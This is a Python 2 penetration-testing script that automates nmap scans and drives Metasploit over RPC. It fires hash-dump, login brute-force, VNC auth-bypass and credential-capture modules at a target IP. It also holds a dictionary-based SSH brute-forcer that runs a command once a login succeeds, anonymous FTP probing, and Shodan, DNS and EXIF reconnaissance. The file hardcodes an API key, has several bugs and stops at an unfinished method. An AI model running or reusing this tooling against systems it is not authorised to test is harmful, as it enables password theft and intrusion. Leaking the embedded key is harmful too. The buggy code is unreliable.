# -*- encoding: utf-8 -*-
'''
Author:Jose Manuel Ortega
email:jmoc25@gmnail.com
'''
import pythonwhois
import sys
import os
import nmap
import pygeoip
import pprint
import shodan
import socket
import dns.resolver
import dns.reversename
import getopt, sys
import paramiko
import platform
import urllib, urllib2, requests, json
import ftplib
from bs4 import BeautifulSoup
from lxml import html 
import urlparse
import time

#geolocation lib
from pygeocoder import Geocoder

#images lib
from PIL.ExifTags import TAGS, GPSTAGS
from PIL import Image

#pdf lib
from PyPDF2 import PdfFileReader, PdfFileWriter

#datetime
from datetime import datetime

#metaexploit framwework
import msfrpc

#nexpose
import pynexposeHttps

#for request password
import getpass

#class for Log in files and write information about commands
class Log(object):
    def __init__(self, *files):
        self.files = files
    def write(self, obj):
        for f in self.files:
            f.write(obj)
            f.flush()
    def flush(self) :
        for f in self.files:
            f.flush()
            
#class for connecting with NexposeFrameWork with pynexposeHttps
class NexposeFrameWork:
    def __init__(self, pynexposeHttps):
        self.pynexposeHttps = pynexposeHttps

    def siteListing(self):
        print "\nSites"
        print "--------------------------"
        bsoupSiteListing = BeautifulSoup(self.pynexposeHttps.site_listing(),'lxml')
        for site in bsoupSiteListing.findAll('sitesummary'):
            attrs = dict(site.attrs)
            print "Description: " + attrs['description']
            print "riskscore: " + attrs['riskscore']
            print "Id: " + attrs['id']
            print "riskfactor: " + attrs['riskfactor']
            print "name: " + attrs['name']
            print "\n"

    def vulnerabilityListing(self): 
        print "\nVulnerabilities"
        print "--------------------------"
        bsoupVulnerabilityListing = BeautifulSoup(self.pynexposeHttps.vulnerability_listing(),'lxml')
        for vulnerability in bsoupVulnerabilityListing.findAll('vulnerabilitysummary'):
            attrs = dict(vulnerability.attrs)
            print "Id: " + attrs['id']
            print "Severity: " + attrs['severity']
            print "Title: " + attrs['title']
            bsoupVulnerabilityDetails = BeautifulSoup(self.pynexposeHttps.vulnerability_details(attrs['id']),'lxml')
            for vulnerability_description in bsoupVulnerabilityDetails.findAll('description'):
                print "Description: " + vulnerability_description.text
                print "\n"
    
#class for connecting with MetaSploit and launch console commands
class MetaSploitFrameWork:
    
    def __init__(self, port, host, ip, user, password):
        self.client = msfrpc.Msfrpc({'uri':'/msfrpc', 'port':port, 'host':host, 'ssl': True})
        self.auth = self.client.login(user,password)
        #Escaneo sincrono
        self.nm = nmap.PortScanner()
        if self.auth:
            self.console = self.client.call('console.create')
        self.ip = ip
    
    def scanMetaSploitFrameWork(self):
    
        print 'Scannning Port MetaExploitFrameWork....................'
    
        # Check what time the scan started
        t1 = datetime.now()
        
        #scan port FTP,SSH,HTTP,SSL,MYSQL,VNC,POSTGRES,MONGODB
        self.nm.scan(ip, arguments="-A -sV -p21,22,80,8080,443,5432,3306,27017,1241,9160,5900")

        host = self.nm.all_hosts()[0]
        print 'Host: ' + host

        for port in self.nm[host]['tcp']:
            print 'Port {0} --> {1}'.format(port,self.nm[host]['tcp'][port]['state'])
            
            #mysql
            if (port==3306) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking MYSQL scripts......'
                self.metaSploitMYSQL()
            
            #FTP
            if (port==21) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking FTP scripts......'
                self.metaSploitFTP()
            
            #vnc
            if (port==5900) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking VNC scripts......'
                self.metaSploitVNC()
                
            #postgres
            if (port==5432) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking POSTGRES scripts......'
                self.metaSploitPostGres()
                
            #mongodb
            if (port==27017) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking MONGODB scripts......'
                self.metaSploitMongoDB()
                
            
            #ssl
            if (port==443) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking SSL scripts......'
                self.metaSploitSSL()
                
            #ssh
            if (port==22) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking SSH scripts......'
                self.metaSploitSSH()
                
            #http
            if (port==80 or port==8080) and self.nm[host]['tcp'][port]['state']=='open':
                print 'Checking HTTP scripts......'
        
        
        # Checking the time again
        t2 = datetime.now()

        # Calculates the difference of time, to see how long it took to run the script
        total =  t2 - t1

        # Printing the information to screen
        print 'Scanning Completed in: ', total
        
    def processData(self, consoleId):
        while True:
            readedData = self.client.call('console.read',[consoleId])
            print readedData['data']
            if len(readedData['data']) > 1:
                print readedData['data']
            if readedData['busy'] == True:
                time.sleep(1)
                continue
            break
        
    

            
    #METASPLOIT SSL
    def metaSploitSSL(self):
        
        #auxiliary/gather/impersonate_ssl
        cmdSSLimpersonate = """auxiliary/gather/impersonate_ssl
        set RHOSTS """+ip
    
        cmdSSLimpersonate = cmdSSLimpersonate +"""\nrun 
        """
        print cmdSSLimpersonate
    
        print self.client.call('console.write',[self.console['id'],cmdSSLimpersonate])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/http/ssl
        cmdSSLhttp = """auxiliary/scanner/http/ssl
        set RHOSTS """ + self.ip
    
        cmdSSLhttp = cmdSSLhttp +"""\nrun 
        """
        print cmdSSLhttp
    
        print self.client.call('console.write',[self.console['id'],cmdSSLhttp])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/http/ssl_version
        cmdSSLversion = """auxiliary/scanner/http/ssl_version
        set RHOSTS """ + self.ip
    
        cmdSSLversion = cmdSSLversion +"""\nrun 
        """
        print cmdSSLversion
    
        print self.client.call('console.write',[self.console['id'],cmdSSLversion])
        self.processData(self.console['id'])
        
    #METASPLOIT SSH
    def metaSploitSSH(self):
        
        #auxiliary/scanner/ssh/cerberus_sftp_enumusers
        cmdSSHenumUsers = """auxiliary/scanner/ssh/cerberus_sftp_enumusers
        set RHOSTS """ + self.ip
    
        cmdSSHenumUsers = cmdSSHenumUsers +"""\nrun 
        """
        print cmdSSHenumUsers
    
        print self.client.call('console.write',[self.console['id'],cmdSSHenumUsers])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/ssh/detect_kippo
        cmdSSHkippo = """auxiliary/scanner/ssh/detect_kippo
        set RHOSTS """ + self.ip
    
        cmdSSHkippo = cmdSSHkippo +"""\nrun 
        """
        print cmdSSHkippo
    
        print self.client.call('console.write',[self.console['id'],cmdSSHkippo])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/ssh/ssh_enumusers
        cmdSSHenumUsers = """auxiliary/scanner/ssh/ssh_enumusers
        set RHOSTS """ + self.ip
    
        cmdSSHenumUsers = cmdSSHenumUsers +"""\nrun 
        """
        print cmdSSHenumUsers
    
        print self.client.call('console.write',[self.console['id'],cmdSSHenumUsers])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/ssh/ssh_identify_pubkeys
        cmdSShpubkeys = """auxiliary/scanner/ssh/ssh_identify_pubkeys
        set RHOSTS """ + self.ip
    
        cmdSShpubkeys = cmdSShpubkeys +"""\nrun 
        """
        print cmdSShpubkeys
    
        print self.client.call('console.write',[self.console['id'],cmdSShpubkeys])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/ssh/ssh_login
        cmdSShLogin = """auxiliary/scanner/ssh/ssh_login
        set RHOSTS """ + self.ip
    
        cmdSShLogin = cmdSShLogin +"""\nrun 
        """
        print cmdSShLogin
    
        print self.client.call('console.write',[self.console['id'],cmdSShLogin])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/ssh/ssh_login_pubkey
        cmdSShLoginPubKey = """auxiliary/scanner/ssh/ssh_login_pubkey
        set RHOSTS """ + self.ip
    
        cmdSShLoginPubKey = cmdSShLoginPubKey +"""\nrun 
        """
        print cmdSShLoginPubKey
    
        print self.client.call('console.write',[self.console['id'],cmdSShLoginPubKey])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/ssh/ssh_version
        cmdSShVersion = """auxiliary/scanner/ssh/ssh_version
        set RHOSTS """ + self.ip
    
        cmdSShVersion = cmdSShVersion +"""\nrun 
        """
        print cmdSShVersion
    
        print self.client.call('console.write',[self.console['id'],cmdSShVersion])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/ssh/ssh_version
        cmdSShVersion = """auxiliary/scanner/ssh/ssh_version
        set RHOSTS """ + self.ip
    
        cmdSShVersion = cmdSShVersion +"""\nrun 
        """
        print cmdSShVersion
    
        print self.client.call('console.write',[self.console['id'],cmdSShVersion])
        self.processData(self.console['id'])
        
    #METASPLOIT mongodb
    def metaSploitMongoDB(self):
        
        #auxiliary/gather/mongodb_js_inject_collection_enum
        cmdMongoDBEnum = """auxiliary/gather/mongodb_js_inject_collection_enum
        set RHOSTS """ + self.ip
    
        cmdMongoDBEnum = cmdMongoDBEnum +"""\nrun 
        """
        print cmdMongoDBEnum
    
        print self.client.call('console.write',[self.console['id'],cmdMongoDBEnum])
        self.processData(self.console['id'])
    
        #auxiliary/gather/mongodb_js_inject_collection_enum
        cmdMongoDBEnum = """auxiliary/gather/mongodb_js_inject_collection_enum
        set RHOSTS """ + self.ip
    
        cmdMongoDBEnum = cmdMongoDBEnum +"""\nrun 
        """
        print cmdMongoDBEnum
    
        print self.client.call('console.write',[self.console['id'],cmdMongoDBEnum])
        self.processData(self.console['id'])
        
        #METASPLOIT FTP
    def metaSploitFTP(self):
        
        #auxiliary/scanner/ftp/anonymous
        cmdFtpAnonymous="""use auxiliary/scanner/ftp/anonymous
        set RHOSTS """ + self.ip

        cmdFtpAnonymous = cmdFtpAnonymous +"""\nrun 
        """
        print cmdFtpAnonymous
    
        print self.client.call('console.write',[self.console['id'],cmdFtpAnonymous])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/ftp/ftp_login
        cmdFtpLogin="""use auxiliary/scanner/ftp/ftp_login
        set RHOSTS """ + self.ip

        cmdFtpLogin = cmdFtpLogin +"""\nrun 
        """
        print cmdFtpLogin
    
        print self.client.call('console.write',[self.console['id'],cmdFtpLogin])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/ftp/ftp_version
        cmdFtpVersion="""use auxiliary/scanner/ftp/ftp_version
        set RHOSTS """+ self.ip

        cmdFtpVersion = cmdFtpVersion +"""\nrun 
        """
        print cmdFtpVersion
    
        print self.client.call('console.write',[self.console['id'],cmdFtpVersion])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/portscan/ftpbounce
        cmdFtpScanner="""use auxiliary/scanner/portscan/ftpbounce
        set RHOSTS """+ self.ip + """
        set BOUNCEHOST """ + self.ip
        cmdFtpScanner = cmdFtpScanner +"""\nrun 
        """
        print cmdFtpScanner
    
        print self.client.call('console.write',[self.console['id'],cmdFtpScanner])
        self.processData(self.console['id'])
        
    #METASPLOIT MYSQL
    def metaSploitMYSQL(self):
        
        #use auxiliary/scanner/mysql/mysql_authbypass_hashdump
        cmdMysqlAuth="""use auxiliary/scanner/mysql/mysql_authbypass_hashdump
        set RHOSTS """+ self.ip
    
        cmdMysqlAuth = cmdMysqlAuth +"""\nrun 
        """
        print cmdMysqlAuth
    
        print self.client.call('console.write',[self.console['id'],cmdMysqlAuth])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/mysql/mysql_file_enum
        cmdMysqlEnum="""auxiliary/scanner/mysql/mysql_file_enum
        set RHOSTS """+ self.ip
    
        cmdMysqlEnum = cmdMysqlEnum +"""\nrun 
        """
        print cmdMysqlEnum
    
        print self.client.call('console.write',[self.console['id'],cmdMysqlEnum])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/mysql/mysql_login
        cmdMysqlLogin="""auxiliary/scanner/mysql/mysql_login
        set RHOSTS """ + self.ip
    
        cmdMysqlLogin = cmdMysqlLogin +"""\nrun 
        """
        print cmdMysqlLogin
    
        print self.client.call('console.write',[self.console['id'],cmdMysqlLogin])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/mysql/mysql_schemadump
        cmdMysqlSchema="""auxiliary/scanner/mysql/mysql_schemadump
        set RHOSTS """ + self.ip
    
        cmdMysqlSchema = cmdMysqlSchema +"""\nrun 
        """
        print cmdMysqlSchema
    
        print self.client.call('console.write',[self.console['id'],cmdMysqlSchema])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/mysql/mysql_version
        cmdMysqlVersion="""auxiliary/scanner/mysql/mysql_version
        set RHOSTS """ + self.ip
    
        cmdMysqlVersion = cmdMysqlVersion +"""\nrun 
        """
        print cmdMysqlVersion
    
        print self.client.call('console.write',[self.console['id'],cmdMysqlVersion])
        self.processData(self.console['id'])
    
        #use auxiliary/server/capture/mysql
        cmdMysqlServerCapture="""auxiliary/server/capture/mysql
        set RHOSTS """ + self.ip
    
        cmdMysqlServerCapture = cmdMysqlServerCapture +"""\nrun 
        """
        print cmdMysqlServerCapture
    
        print self.client.call('console.write',[self.console['id'],cmdMysqlServerCapture])
        self.processData(self.console['id'])
        
    #METASPLOIT POSTGRES
    def metaSploitPostGres(self):
  
        #use auxiliary/scanner/postgres/postgres_dbname_flag_injection
        cmdPostgresDBName="""auxiliary/scanner/postgres/postgres_dbname_flag_injection
        set RHOSTS """ + self.ip
    
        cmdPostgresDBName = cmdPostgresDBName +"""\nrun 
        """
        print cmdPostgresDBName
    
        print self.client.call('console.write',[self.console['id'],cmdPostgresDBName])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/postgres/postgres_hashdump
        cmdPostgresHashDump="""auxiliary/scanner/postgres/postgres_hashdump
        set RHOSTS """ + self.ip
    
        cmdPostgresHashDump = cmdPostgresHashDump +"""\nrun 
        """
        print cmdPostgresHashDump
    
        print self.client.call('console.write',[self.console['id'],cmdPostgresHashDump])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/postgres/postgres_login
        cmdPostgresLogin="""auxiliary/scanner/postgres/postgres_login
        set RHOSTS """ + self.ip
    
        cmdPostgresLogin = cmdPostgresLogin +"""\nrun 
        """
        print cmdPostgresLogin
    
        print self.client.call('console.write',[self.console['id'],cmdPostgresLogin])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/postgres/postgres_version
        cmdPostgresVersion="""auxiliary/scanner/postgres/postgres_version
        set RHOSTS """ + self.ip
    
        cmdPostgresVersion = cmdPostgresVersion +"""\nrun 
        """
        print cmdPostgresVersion
    
        print self.client.call('console.write',[self.console['id'],cmdPostgresVersion])
        self.processData(self.console['id'])
    
        #use auxiliary/scanner/postgres/postgres_schemadump
        cmdPostgresSchema = """auxiliary/scanner/postgres/postgres_schemadump
        set RHOSTS """ + self.ip
    
        cmdPostgresSchema = cmdPostgresSchema +"""\nrun 
        """
        print cmdPostgresSchema
    
        print self.client.call('console.write',[self.console['id'],cmdPostgresSchema])
        self.processData(self.console['id'])
    
        #use auxiliary/server/capture/postgresql
        cmdPostgresServer = """auxiliary/server/capture/postgresql
        set RHOSTS """ + self.ip
    
        cmdPostgresServer = cmdPostgresSchema +"""\nrun 
        """
        print cmdPostgresServer
    
        print self.client.call('console.write',[self.console['id'],cmdPostgresServer])
        self.processData(self.console['id'])
        
    #METASPLOIT VNC
    def metaSploitVNC(self):

        #auxiliary/scanner/vnc/vnc_login
        cmdVNCLgoin = """auxiliary/scanner/vnc/vnc_login
        set RHOSTS """ + self.ip
    
        cmdVNCLgoin = cmdVNCLgoin +"""\nrun 
        """
        print cmdVNCLgoin
    
        print self.client.call('console.write',[self.console['id'],cmdVNCLgoin])
        self.processData(self.console['id'])
    
        #auxiliary/scanner/vnc/vnc_none_auth
        cmdVNCAuth = """auxiliary/scanner/vnc/vnc_none_auth
        set RHOSTS """ + self.ip
    
        cmdVNCAuth = cmdVNCAuth +"""\nrun 
        """
        print cmdVNCAuth
    
        print self.client.call('console.write',[self.console['id'],cmdVNCAuth])
        self.processData(self.console['id'])
    
        #auxiliary/server/capture/vnc
        cmdVNCServer = """auxiliary/server/capture/vnc
        set RHOSTS """ + self.ip
    
        cmdVNCServer = cmdVNCServer +"""\nrun 
        """
        print cmdVNCServer
    
        print self.client.call('console.write',[self.console['id'],cmdVNCServer])
        self.processData(self.console['id'])
    
        #auxiliary/admin/vnc/realvnc_41_bypass
        cmdVNCByPass = """auxiliary/admin/vnc/realvnc_41_bypass
        set RHOSTS """+ self.ip
    
        cmdVNCByPass = cmdVNCByPass +"""\nrun 
        """
        print cmdVNCByPass
    
        print self.client.call('console.write',[self.console['id'],cmdVNCByPass])
        self.processData(self.console['id'])
            
#class for obtain metadata info from pdf
class PDFMetaData:
    
    def printMetaData(self):
        for dirpath, dirnames, files in os.walk("pdfs"):
            try:
                for name in files:
                    ext = name.lower().rsplit('.', 1)[-1]
                    if ext in ['pdf']:
                        print "[+] Metadata for file: %s " %(dirpath+os.path.sep+name)
                        pdfFile = PdfFileReader(file(dirpath+os.path.sep+name, 'rb'))
                        docInfo = pdfFile.getDocumentInfo()
                        for metaItem in docInfo:
                            print '[+] ' + metaItem + ':' + docInfo[metaItem]
                        print "\n"
            except Exception,e:
                print "Error to Obtain PDF METADATA"
                pass

#class for obtain metadata info from images                
class ImageMetaData:

    def decode_gps_info(self,exif):
        gpsinfo = {}
        if 'GPSInfo' in exif:
            '''
            Raw Geo-references
            for key in exif['GPSInfo'].keys():
                decode = GPSTAGS.get(key,key)
                gpsinfo[decode] = exif['GPSInfo'][key]
            exif['GPSInfo'] = gpsinfo
            '''
        
            #Parse geo references.
            Nsec = exif['GPSInfo'][2][2][0] / float(exif['GPSInfo'][2][2][1])
            Nmin = exif['GPSInfo'][2][1][0] / float(exif['GPSInfo'][2][1][1])
            Ndeg = exif['GPSInfo'][2][0][0] / float(exif['GPSInfo'][2][0][1])
            Wsec = exif['GPSInfo'][4][2][0] / float(exif['GPSInfo'][4][2][1])
            Wmin = exif['GPSInfo'][4][1][0] / float(exif['GPSInfo'][4][1][1])
            Wdeg = exif['GPSInfo'][4][0][0] / float(exif['GPSInfo'][4][0][1])
            if exif['GPSInfo'][1] == 'N':
                Nmult = 1
            else:
                Nmult = -1
            if exif['GPSInfo'][1] == 'E':
                Wmult = 1
            else:
                Wmult = -1
            Lat = Nmult * (Ndeg + (Nmin + Nsec/60.0)/60.0)
            Lng = Wmult * (Wdeg + (Wmin + Wsec/60.0)/60.0)
            exif['GPSInfo'] = {"Lat" : Lat, "Lng" : Lng}
        else:
            print "No metadata info"
 
    def get_exif_metadata(self,image_path):
        ret = {}
        image = Image.open(image_path)
        if hasattr(image, '_getexif'):
            exifinfo = image._getexif()
            if exifinfo is not None:
                for tag, value in exifinfo.items():
                    decoded = TAGS.get(tag, tag)
                    ret[decoded] = value
        self.decode_gps_info(ret)
        return ret
    
    def printMetaData(self):
        for dirpath, dirnames, files in os.walk("images"):
            try:
                for name in files:
                    print "[+] Metadata for file: %s " %(dirpath+os.path.sep+name)
                    try:
                        exifData = {}
                        exif = self.get_exif_metadata(dirpath+os.path.sep+name)
                        for metadata in exif:
                            print "Metadata: %s - Value: %s " %(metadata, exif[metadata])
                        print "\n"

                    except:
                        import sys, traceback
                        traceback.print_exc(file=sys.stdout)
            except Exception,e:
                print "Error to Obtain Images METADATA"
                pass
 
#class dns resolver
class dnsResolver:

    def __init__(self):
        self.myresolver = dns.resolver.Resolver()
        self.myresolver.domain = dns.name.Name("google-public-dns-a.google.com")
        self.myresolver.nameserver = ['8.8.8.8']
        
    def checkDNSInfo(self,ip,hostname):
        print "-------------------------------------------"
        print "Obtain domain and DNS"
        print "-------------------------------------------"

        try:
            whois = pythonwhois.get_whois(ip)
            for key in whois.keys():
                if key =='raw':
                    info = whois[key][0].split("\n")
                    for i in info:
                        print i
                else:    
                    print "[+] %s : %s \n" %(key, whois[key])
        except Exception,e:
                print e

        try:
            self.myresolver.hostData(hostname)
        except Exception,e:
                print e
                
    def hostData(self,hostName):
        print "\nInformation about DNS servers"
        print "---------------------------------"
        try:
            answers = self.myresolver.query(hostName, 'CNAME')
            for rdata in answers:
                print "CNAME:", str(rdata.target)
        except dns.resolver.NoAnswer:
            print "Can not obtain CNAME"
            
        try:
            answers = self.myresolver.query(hostName, 'A')
            ip = []
            for rdata in answers:
                n = dns.reversename.from_address(rdata.address)
                try:
                    answers_inv = self.myresolver.query(n, 'PTR')
                    for rdata_inv in answers_inv:
                        ip += [(rdata.address, str(rdata_inv.target))]
                except dns.resolver.NoAnswer:
                        ip += [(rdata.address, "PTR: No response "+str(n))]
                except dns.resolver.NXDOMAIN:
                        ip += [(rdata.address, "PTR: Domain NX "+str(n))]
                print "IPs:", ip
        except dns.resolver.NoAnswer:
            print "Can not obtain IPs"

        try:
            answers = self.myresolver.query(hostName, 'MX')
            mx = []
            for rdata in answers:
                mx += [str(rdata.exchange)]
            print "MXs:", mx
        except dns.resolver.NoAnswer:
            print "Can not obtain MXs"

        try:
            answers = self.myresolver.query(hostName,'NS')
            ns = []
            for rdata in answers:
                ns += [str(rdata.target)]
            print "NSs:", ns
        except dns.resolver.NoAnswer:
            print "Can not obtain NSs"

        try:
            answers = self.myresolver.query(hostName, 'SOA')
            for rdata in answers:
                print "SOA:", str(rdata.mname), str(rdata.rname)
        except dns.resolver.NoAnswer:
            print "Can not obtain SOA"

        try:
            answers = self.myresolver.query(hostName, 'TXT')
            for rdata in answers:
                print "TXT:", rdata.strings
        except dns.resolver.NoAnswer:
            print "Can not obtain TXT"

        try:
            answers = self.myresolver.query(hostName, 'LOC')
            for rdata in answers:
                print "LOC:", "Latitud",rdata.float_latitude,"Logitud", rdata.float_longitude
        except dns.resolver.NoAnswer:
            print "Can not obtain LOC"

        try:
            answers = self.myresolver.query(hostName, 'MINFO')
            for rdata in answers:
                print "MINFO:", rdata.to_text()
        except dns.resolver.NoAnswer:
            print "Can not obtain MINFO"

        try:
            answers = self.myresolver.query(hostName, 'HINFO')
            for rdata in answers:
                print "HINFO:", rdata.to_text()
        except dns.resolver.NoAnswer:
            print "Can not obtain HINFO"
 
#class for search in shodan
class ShodanSearch:

    def __init__(self):
        #shodan key
        shodanKeyString = 'v4YpsPUJ3wjDxEqywwu6aF5OZKWj8kik'
        self.shodanApi = shodan.Shodan(shodanKeyString)
        
    def shodanKeyInfo(self):
        try:
            info = self.shodanApi.info()
            for inf in info:
                print '%s: %s ' %(inf, info[inf])
        except Exception, e:
            print 'Error: %s' % e
            

    #Obtain info IP
    def obtain_host_info(self,IP):
        try:
                host = self.shodanApi.host(IP)
                if len(host) != 0:
                            # Print host info
                            print 'IP: %s' % host.get('ip_str')
                            print 'Country: %s' % host.get('country_name','Unknown')
                            print 'City: %s' % host.get('city','Unknown')
                            print 'Latitude: %s' % host.get('latitude')
                            print 'Longitude: %s' % host.get('longitude')
                            print 'Hostnames: %s' % host.get('hostnames')
                            for i in host['data']:
                               print 'Port: %s' % i['port']
                               
                            return host
        except shodan.APIError, e:
                print ' Error obtaning info from Shodan Service: %s' % e
                
#class for SSH connection                
class SSHConnection:
    
    def __init__(self):
        #ssh connection with paramiko library
        self.ssh = paramiko.SSHClient()
    
    def ssh_connect(self,ip,user,password,code=0):
        
        self.ssh.load_system_host_keys()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        
        print("[*] Testing user and password from dictionary")
        print("[*] User: %s" %(user))
        print("[*] Pass :%s" %(password))
        
        try:
            self.ssh.connect(ip,port=22,username=user,password=password, timeout=5)
        except paramiko.AuthenticationException:
            code = 1
        except socket.error,e:
            code = 2

            self.ssh.close()
            return code
	    
    def startSSHBruteForce(self,host):
        try:
            #open files dictionary
            users_file = open("users.txt")
            passwords_file = open("passwords.txt")

            for user in users_file.readlines():
                for password in passwords_file.readlines():
                
                    user_text = user.strip("\n")
                    password_text = password.strip("\n")

                    try:
                                    #check connection with user and password
                                    response = self.ssh_connect(host,user_text,password_text)
                                    if response == 0:
                                            print("[*] User: %s [*] Pass Found:%s" %(user_text,password_text))
                                            stdin,stdout,stderr = self.ssh.exec_command("ifconfig")
                                            for line in stdout.readlines():
                                                print line.strip()
                                            sys.exit(0)
                                    elif response == 1:
                                        print("[*] User: %s [*] Pass %s => Login incorrect !!!" %(user,password))
                                    elif response == 2:
                                        print("[*] Connection could not be established to %s" %(host))
                                        sys.exit(2)
				
                    except Exception,e:
                                print "Error ssh connection"
                                pass
            #close files
            users_file.close()
            passwords_file.close()
        
        except Exception,e:
            print "users.txt /passwords.txt Not found"
            pass
    
    def SSHBruteForce(self,host):
        #check port 22 is open
        try:
            sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((host,22))
            if result == 0:
                print "Port 22 open"
                response = raw_input ("Would you like start brute force process over "+ host +"?[s/n]")
                if response == "s" or response == "S":
                        self.startSSHBruteForce(host)
            else:
                print "Port 22 closed"
            sock.close()
        except KeyError:
            # Key is not present
            print "Error checking ports!"
            pass
        except socket.gaierror:
            print 'Hostname could not be resolved. Exiting'
            sys.exit()
        except socket.error:
            print "Couldn't connect to server"
            sys.exit()
  
#class for FTP connection                
class FTPConnection:
    
    def __init__(self,url):
        #ftp connection with ftplib library
        self.url = url
    
    def ftpConnectionAnonymous(self):
        #check port 21 is open
        try:
            sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.url,21))
            if result == 0:
                print "Port 21 open"
                response = raw_input ("Would you like connect with anonymous user to the site "+ self.url +"?[s/n]")
                if response == "s" or response == "S":
                        try:
                            self.ftpClient = ftplib.FTP(self.url)
                            self.ftpClient.login()
                            print "Connecting to site %s"%self.url
                            print self.ftpClient.retrlines('LIST')
                            self.ftpClient.quit()
                            print "Exiting site %s"%self.url
                        except:
                            print "Error in listing " +self.url
            else:
                print "Port 21 closed"
            sock.close()
        except KeyError:
            # Key is not present
            print "Error checking ports!"
            pass
        except socket.gaierror:
            print 'Hostname could not be resolved. Exiting'
            sys.exit()
        except socket.error:
            print "Couldn't connect to server"
            sys.exit()
            
#class foR CHECK methods                
class Checker:
    
    def checkOptionMethods(self,hostname):
        try:
            r = requests.options('http://'+ hostname, timeout=5)
            print(r.headers['allow'])
        except KeyError:
            # Key is not present
            print "Not allow methods found!"
            pass
        except Exception,e:
                print "Error to connect with " + hostname + " for obtain option methods" 
                pass
    
    def checkOpenPorts(self,hostname,portlist):
        # Check what time the scan started
        t1 = datetime.now()
        print "Cheking ports...."
        print portlist
        try:
            for port in portlist:
                sock= socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                sock.settimeout(5)
                result = sock.connect_ex((hostname,port))
                if result == 0:
                    print "Port {}: \t Open".format(port)
                sock.close()
        except KeyError:
            # Key is not present
            print "Error checking ports!"
            pass
        except socket.gaierror:
            print 'Hostname could not be resolved. Exiting'
            sys.exit()
        except socket.error:
            print "Couldn't connect to server"
            sys.exit()
        
        # Checking the time again
        t2 = datetime.now()

        # Calculates the difference of time, to see how long it took to run the script
        total =  t2 - t1

        # Printing the information to screen
        print 'Scanning Completed in: ', total

    def checkHeadersInfoByHostName(self,hostname):
        # Get the headers of a given hostname
        resp = requests.head('http://'+hostname)
        print resp.status_code, resp.text, resp.headers

        response = requests.get('http://'+hostname)
        for header, value in response.headers.items():
            print header+' : '+value

    def checkHeadersInfoByIp(self,ip):
        # Get the headers of a given IP
        resp = requests.head('http://'+ip)
        print resp.status_code, resp.text, resp.headers

        response = requests.get('http://'+ip)
        for header, value in response.headers.items():
            print header+' : '+value
            

def callbackHTTP(host, result):
        try:
            script = result['scan'][host]['tcp'][80]['script']

            for key, value in script.items():
                print 'Script {0} --> {1}'.format(key, value)
        except Exception,KeyError:
            # Key is not present
            pass

def callbackPostgres(host, result):
        try:
            script = result['scan'][host]['tcp'][5432]['script']

            for key, value in script.items():
                print 'Script {0} --> {1}'.format(key, value)
        except KeyError:
            # Key is not present
            pass
 
def callbackMySql(host, result):
        try:
            script = result['scan'][host]['tcp'][3306]['script']

            for key, value in script.items():
                print 'Script {0} --> {1}'.format(key, value)
        except KeyError:
            # Key is not present
            pass

def callbackMongoDB(host, result):
        try:
            script = result['scan'][host]['tcp'][27017]['script']

            for key, value in script.items():
                print 'Script {0} --> {1}'.format(key, value)
        except KeyError:
            # Key is not present
            pass
    
def callbackSSH(host, result):
        try:
            script = result['scan'][host]['tcp'][22]['script']

            for key, value in script.items():
                print 'Script {0} --> {1}'.format(key, value)
        except KeyError:
            # Key is not present
            pass  

def callbackFTP(host, result):
        try:
            script = result['scan'][host]['tcp'][21]['script']

            for key, value in script.items():
                print 'Script {0} --> {1}'.format(key, value)
        except KeyError:
            # Key is not present
            pass  
    
def callbackSSL(host, result):
        try:
            script = result['scan'][host]['tcp'][443]['script']

            for key, value in script.items():
                print 'Script {0} --> {1}'.format(key, value)
        except KeyError:
            # Key is not present
            pass  

def callbackVNC(host, result):
        try:
            script = result['scan'][host]['tcp'][5900]['script']

            for key, value in script.items():
                print 'Script {0} --> {1}'.format(key, value)
        except KeyError:
            # Key is not present
            pass  
    
def callbackMetaExploit(host, result):
        try:
            script = result['scan'][host]['tcp'][55553]['script']

            for key, value in script.items():
                print 'Script {0} --> {1}'.format(key, value)
        except KeyError:
            # Key is not present
            pass  
    
 
def callbackNessus(host, result):
        try:
            script = result['scan'][host]['tcp'][1241]['script']

            for key, value in script.items():
                print 'Script {0} --> {1}'.format(key, value)
        except KeyError:
            # Key is not present
            pass
    
def callbackCassandra(host, result):
        try:
            script = result['scan'][host]['tcp'][9160]['script']

            for key, value in script.items():
                print 'Script {0} --> {1}'.format(key, value)
        except KeyError:
            # Key is not present
            pass
        
#class foR NMAP Scanning               
class ScanningNMAP:
    
    def __init__(self):
        #Escaneo asincrono
        self.nma = nmap.PortScannerAsync()
        #Escaneo sincrono
        self.nm = nmap.PortScanner()
        
    def scanNMAP(self,ip,portlist):
        print "Cheking ports...."
        print portlist
        self.nm.scan(ip, '21,22,80,8080,443,5432,3306,27017,55553,1241,9160,5900')
        for port in self.nm[ip]['tcp']:
            thisDict = self.nm[ip]['tcp'][port]
            print 'Port ' + str(port) + ': ' + thisDict['state'] + ' ' + thisDict['name']
            
    def scanning(self):
